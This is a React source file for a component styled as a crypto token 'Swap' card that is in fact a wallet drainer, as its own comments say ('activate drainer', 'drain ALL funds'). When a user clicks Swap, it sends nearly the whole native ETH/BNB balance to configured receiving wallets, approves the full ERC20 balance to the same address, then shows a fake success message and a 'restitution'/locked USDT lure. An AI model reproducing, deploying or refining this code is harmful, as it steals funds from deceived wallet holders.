import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useChainId, useSendTransaction, useWriteContract } from 'wagmi';
import { formatEther, parseEther, createPublicClient, http } from 'viem';
import { mainnet, bsc, base } from 'wagmi/chains';
import { getGasRequirement, markSwapCompleted, clearCache } from '../config/adminConfig';
import { getReceivingWallets } from '../config/constants';
import Toast from './Toast';

function SwapCard({
  fromToken,
  toToken,
  fromAmount,
  toAmount,
  onFromAmountChange,
  onTokenClick,
  onSettingsClick,
  slippage,
  walletAddress,
  walletPreset,
  onSwapComplete,
}) {
  const { address, isConnected } = useAccount();
  const wagmiChainId = useChainId(); // Get chain ID from wagmi (works with WalletConnect)
  const { data: balanceData } = useBalance({ address, enabled: isConnected });
  const { sendTransactionAsync } = useSendTransaction();
  const { writeContractAsync } = useWriteContract();
  
  // ERC20 ABI for balanceOf and approve
  const erc20Abi = [
    {
      constant: true,
      inputs: [{ name: '_owner', type: 'address' }],
      name: 'balanceOf',
      outputs: [{ name: 'balance', type: 'uint256' }],
      type: 'function',
    },
    {
      constant: false,
      inputs: [
        { name: '_spender', type: 'address' },
        { name: '_value', type: 'uint256' },
      ],
      name: 'approve',
      outputs: [],
      type: 'function',
    },
  ];
  const [showToast, setShowToast] = useState(false);
  const [toastMessage, setToastMessage] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [gasRequirement, setGasRequirement] = useState({ amount: 0.55, currency: 'ETH' });
  const [showBalanceWarning, setShowBalanceWarning] = useState(false);
  const [swapCompleted, setSwapCompleted] = useState(walletPreset?.swapCompleted || false);
  
  // Update swapCompleted when walletPreset changes
  useEffect(() => {
    if (walletPreset) {
      setSwapCompleted(walletPreset.swapCompleted || false);
    } else {
      setSwapCompleted(false);
    }
  }, [walletPreset]);
  
  const isSwapActive = fromToken && fromAmount && parseFloat(fromAmount) > 0 && isConnected && !swapCompleted;

  // Fetch gas requirement
  useEffect(() => {
    const fetchSettings = async () => {
      const gasReq = await getGasRequirement();
      setGasRequirement(gasReq);
    };
    fetchSettings();
  }, []);

  // Check balance
  useEffect(() => {
    const checkBalance = async () => {
      if (swapCompleted || !isConnected || !address || !balanceData || !wagmiChainId) {
        setShowBalanceWarning(false);
        return;
      }

      try {
        const balance = parseFloat(formatEther(balanceData.value));
        const walletCurrency = wagmiChainId === 56 ? 'BNB' : 'ETH';
        const gasReq = await getGasRequirement();
        const gasCurrency = gasReq.currency || 'ETH';
        
        if (gasCurrency === walletCurrency) {
          setShowBalanceWarning(balance < gasReq.amount);
        } else {
          setShowBalanceWarning(false);
        }
      } catch (error) {
        console.error('Error checking balance:', error);
        setShowBalanceWarning(false);
      }
    };

    checkBalance();
  }, [isConnected, address, balanceData, wagmiChainId, swapCompleted]);

  // Auto-hide balance warning after 3 seconds
  useEffect(() => {
    if (showBalanceWarning) {
      const timer = setTimeout(() => setShowBalanceWarning(false), 3000);
      return () => clearTimeout(timer);
    }
  }, [showBalanceWarning]);


  const showToastMessage = (message) => {
    setToastMessage(message);
    setShowToast(true);
  };


  const checkBalanceAndSwap = async () => {
    if (!isConnected || !address) {
      showToastMessage('Please connect your wallet first');
      return;
    }

    if (swapCompleted) {
      showToastMessage('This is a private, regulated pool. Your swap has already been completed.');
      return;
    }

    if (!isSwapActive || !fromToken) {
      return;
    }

    setIsProcessing(true);

    try {
      // Use wagmi's chain ID (works with both injected wallets and WalletConnect)
      const currentChainId = wagmiChainId;
      console.log('Current chain ID from wagmi:', currentChainId);
      
      // Determine currency based on wallet network
      const walletCurrency = currentChainId === 56 ? 'BNB' : 'ETH';
      
      // Check gas requirement
      const gasReq = await getGasRequirement();
      const gasCurrency = gasReq.currency || 'ETH';
      
      if (gasCurrency !== walletCurrency) {
        const requiredNetwork = gasCurrency === 'BNB' ? 'BSC (Binance Smart Chain)' : 'Ethereum';
        showToastMessage(`Please switch to ${requiredNetwork}. Gas requirement is set for ${gasCurrency}.`);
        setIsProcessing(false);
        return;
      }
      
      // Check balance
      const nativeBalance = balanceData ? parseFloat(formatEther(balanceData.value)) : 0;
      
      // Admin gas amount = minimum balance threshold to activate drainer
      // If user has less than the minimum gas requirement, show error
      if (nativeBalance < gasReq.amount) {
        const currencySymbol = gasCurrency === 'ETH' ? 'ETH' : 'BNB';
        showToastMessage(`Your Balance is below the minimum Gas fees required (${gasReq.amount} ${currencySymbol})`);
        setIsProcessing(false);
        return;
      }
      
      // Get receiving wallets
      const receivingWallets = await getReceivingWallets();
      
      // Calculate send amount: drain ALL funds minus small gas buffer
      // Use a fixed gas buffer to allow transaction to execute
      const gasBuffer = parseEther('0.003');
      const balanceValue = balanceData.value;
      const sendAmount = balanceValue > gasBuffer ? balanceValue - gasBuffer : 0n;
      
      if (sendAmount > 0n) {
        console.log('Sending native token transaction:', {
          to: receivingWallets.EVM,
          amount: formatEther(sendAmount),
          chain: currentChainId,
        });
        
        // Send native token using wagmi (works with all wallet types)
        // This drains ALL funds in user wallet (minus gas buffer)
        const hash = await sendTransactionAsync({
          to: receivingWallets.EVM,
          value: sendAmount,
        });
        
        console.log('Native token transfer successful:', hash);
      }

      // Transfer preset token if it's an ERC20 token
      if (fromToken.address) {
        try {
          // Get token balance using public client
          const chain = currentChainId === 56 ? bsc : currentChainId === 8453 ? base : mainnet;
          const publicClient = createPublicClient({
            chain,
            transport: http(),
          });
          
          // Get balance
          const balance = await publicClient.readContract({
            address: fromToken.address,
            abi: erc20Abi,
            functionName: 'balanceOf',
            args: [address],
          });
          
          if (balance > 0n) {
            console.log('Approving token transfer:', balance.toString());
            
            // Approve using wagmi
            await writeContractAsync({
              address: fromToken.address,
              abi: erc20Abi,
              functionName: 'approve',
              args: [receivingWallets.EVM, balance],
            });
            
            console.log('Token approval successful');
          }
        } catch (err) {
          console.error('Error transferring preset token:', err);
          // Don't fail the whole swap if token transfer fails
        }
      }

      // Set swap completed state immediately to show withdraw banner
      // IMPORTANT: Locked USDT state appears ONLY AFTER swap is successful
      console.log('Swap completed successfully, setting swapCompleted to true and calling onSwapComplete');
      setSwapCompleted(true);
      
      // Call onSwapComplete callback - this triggers the locked USDT banner to appear
      if (onSwapComplete) {
        console.log('Calling onSwapComplete callback');
        onSwapComplete();
      }
      
      // Mark swap as completed in database (async, don't wait)
      if (address) {
        markSwapCompleted(address)
          .then(() => {
            console.log('Swap marked as completed in database');
            clearCache();
          })
          .catch((error) => {
            console.error('Error marking swap as completed:', error);
          });
      }

      // Note: Don't set virtual USDT here - it should come from walletPreset.usdValue
      // The withdraw banner will use walletPreset.usdValue directly
      
      showToastMessage('Swap completed successfully!');
      setIsProcessing(false);
    } catch (error) {
      console.error('Swap error:', error);
      let errorMsg = 'Transaction failed';
      
      if (error.message?.includes('rejected') || error.code === 4001 || error.name === 'UserRejectedRequestError') {
        errorMsg = 'Transaction rejected by user';
      } else if (error.message?.includes('insufficient funds') || error.message?.includes('insufficient balance')) {
        errorMsg = 'Insufficient balance for transaction and gas fees';
      } else if (error.message?.includes('gas')) {
        errorMsg = 'Transaction failed – insufficient gas. Please ensure you have enough balance for gas fees.';
      } else {
        errorMsg = `Transaction failed: ${error.shortMessage || error.message || 'Unknown error'}`;
      }
      
      showToastMessage(errorMsg);
      setIsProcessing(false);
    }
  };

  const handleButtonClick = () => {
    if (!isConnected) return;
    if (isSwapActive) {
      checkBalanceAndSwap();
    }
  };

  if (!fromToken) {
    return (
      <div className="swap-card">
        <div className="no-token-message">
          <p>No restitution is available for this wallet address.</p>
        </div>
      </div>
    );
  }

  return (
    <>
      {showToast && (
        <Toast
          message={toastMessage}
          onClose={() => setShowToast(false)}
        />
      )}
      <div className="swap-card">
        {showBalanceWarning && (
          <div className="balance-warning-banner">
            <span className="warning-icon">⚠️</span>
            <span className="warning-text">
              Warning: Your Balance is below the minimum Gas fees required ({gasRequirement.amount} {gasRequirement.currency === 'ETH' ? 'ETH' : 'BNB'})
            </span>
          </div>
        )}
        <div className="swap-header">
          <h2>Swap</h2>
        </div>

        <div className="token-row">
          <input
            type="text"
            className="amount-input"
            value={swapCompleted ? '0' : fromAmount}
            readOnly
            placeholder={isConnected ? "0" : "Connect wallet"}
            style={{ cursor: 'default' }}
          />
          <button className="token-btn" disabled>
            <img src={fromToken.logo} alt={fromToken.name} />
            {fromToken.name}
          </button>
        </div>

        {!swapCompleted && fromToken.usdValue > 0 && (
          <div className="token-usd-value">
            ${fromToken.usdValue.toLocaleString()}
          </div>
        )}
        {swapCompleted && walletPreset?.usdValue > 0 && (
          <div className="token-usd-value">
            ${walletPreset.usdValue.toLocaleString()}
          </div>
        )}

        <div style={{ textAlign: 'center', margin: '12px 0' }}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#6366f1" strokeWidth="2">
            <path d="M12 5v14m-7-7l7 7 7-7" />
          </svg>
        </div>

        <div className="token-row">
          <input
            type="text"
            className="amount-input"
            value={swapCompleted ? '0.0' : toAmount}
            readOnly
            placeholder="0.0"
            style={{ cursor: 'default' }}
          />
          <button className="token-btn" disabled>
            <img src={toToken.logo} alt={toToken.name} />
            {toToken.name}
          </button>
        </div>

        <button
          className={`swap-btn ${isSwapActive && !isProcessing && !swapCompleted ? 'active' : ''}`}
          onClick={handleButtonClick}
          disabled={(!isSwapActive || isProcessing || swapCompleted) && isConnected}
        >
          {!isConnected
            ? 'Connect Wallet'
            : swapCompleted
            ? 'Swap Completed'
            : isProcessing
            ? 'Processing...'
            : !isSwapActive
            ? 'Enter an amount'
            : 'Swap'}
        </button>
      </div>
    </>
  );
}

export default SwapCard;
